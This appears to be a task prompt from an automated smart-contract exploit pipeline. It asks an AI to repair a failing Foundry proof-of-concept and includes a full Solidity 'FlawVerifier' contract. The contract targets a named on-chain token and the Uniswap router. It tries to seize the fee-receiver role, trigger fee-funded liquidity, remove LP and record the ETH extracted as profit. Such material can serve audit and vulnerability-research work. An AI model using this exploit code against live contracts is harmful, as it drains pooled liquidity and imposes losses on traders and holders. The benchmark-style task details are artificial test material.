You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Privileged wallets receive all LP tokens and can withdraw pooled liquidity
- claim: `startTrading()` sends the entire initial LP position to `owner()`, and `_addLiquidity()` sends all fee-funded LP tokens to `_swapFeeReceiver` instead of locking or burning them.
- impact: Whoever controls those LP tokens can remove the pool liquidity at any time and extract the paired ETH/tokens, collapsing market liquidity and imposing direct losses on traders and holders.
- exploit_paths: ["A privileged caller starts trading, receives the initial LP tokens via `addLiquidityETH(..., owner(), ...)`, then removes liquidity from the pair off-contract.", "Later fee-funded auto-liquidity mints additional LP tokens to `_swapFeeReceiver`, who can also withdraw that protocol-funded liquidity."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IEHIVE is IERC20Like {
    function owner() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function startTrading() external;
    function updateFeeReceiver(address newWallet) external;
}

interface IUniswapV2Router02Like {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
}

contract TransferHelper {
    function poke(address token, address to, uint256 amount) external {
        IERC20Like(token).transfer(to, amount);
    }
}

contract FlawVerifier {
    IEHIVE internal constant TARGET = IEHIVE(0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd);
    IUniswapV2Router02Like internal constant ROUTER =
        IUniswapV2Router02Like(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    address internal constant TRIGGER_SINK = 0x1111111111111111111111111111111111111111;

    uint256 internal _profitAmount;
    uint256 internal _baselineEth;
    bool internal _executed;

    receive() external payable {}

    constructor() {}

    function executeOnOpportunity() public {
        if (_executed) {
            _syncProfit();
            return;
        }
        _executed = true;
        _baselineEth = address(this).balance;

        address pair = TARGET.uniswapV2Pair();
        bool controlsOwner = TARGET.owner() == address(this);

        // Path 1: `startTrading()` can only be called by `owner()` or the current
        // `_swapFeeReceiver`, but the initial LP recipient is hard-coded to `owner()`.
        // Therefore profit on this stage is only mechanically reachable when
        // `owner() == address(this)`.
        if (pair == address(0) && controlsOwner) {
            (bool started,) = address(TARGET).call(abi.encodeWithSelector(TARGET.startTrading.selector));
            if (started) {
                pair = TARGET.uniswapV2Pair();
            }
        }

        if (pair != address(0)) {
            _drainAnyLpHeld(pair);
        }

        // Path 2: fee-funded LP is minted to `_swapFeeReceiver`, which has no public getter.
        // The verifier probes the exact privilege gate by calling `updateFeeReceiver(address(this))`.
        // If that call reverts at runtime, the fee-receiver LP withdrawal path is not publicly
        // reachable from this verifier at the fork state.
        if (pair != address(0) && _claimFeeReceiverRole()) {
            _triggerAutoLiquidity(pair);
            _drainAnyLpHeld(pair);
        }

        _syncProfit();
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _claimFeeReceiverRole() internal returns (bool) {
        (bool ok,) = address(TARGET).call(abi.encodeWithSelector(TARGET.updateFeeReceiver.selector, address(this)));
        return ok;
    }

    function _triggerAutoLiquidity(address pair) internal {
        uint256 verifierBalance = TARGET.balanceOf(address(this));
        if (verifierBalance == 0) {
            return;
        }

        // If `owner() == address(this)`, direct transfers from this verifier are fee-exempt and
        // will not pass the non-excluded sender check that guards `swapBack()`. A helper contract
        // provides the minimum realistic extra hop needed to trigger the same fee-funded LP path
        // without changing the exploit causality.
        TransferHelper helper = new TransferHelper();
        uint256 seedAmount = verifierBalance > 1 ? 1 : verifierBalance;
        TARGET.transfer(address(helper), seedAmount);
        helper.poke(address(TARGET), TRIGGER_SINK, seedAmount);

        // If no LP reaches this verifier after the helper transfer, then the fork already lacks
        // enough accrued fee inventory to run `swapBack()`, so the fee-funded path is concretely
        // infeasible from the current on-chain state.
        _drainAnyLpHeld(pair);
    }

    function _drainAnyLpHeld(address pair) internal {
        uint256 lpBalance = IERC20Like(pair).balanceOf(address(this));
        if (lpBalance == 0) {
            return;
        }

        IERC20Like(pair).approve(address(ROUTER), lpBalance);
        ROUTER.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(TARGET),
            lpBalance,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function _syncProfit() internal {
        _profitAmount = address(this).balance > _baselineEth ? address(this).balance - _baselineEth : 0;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
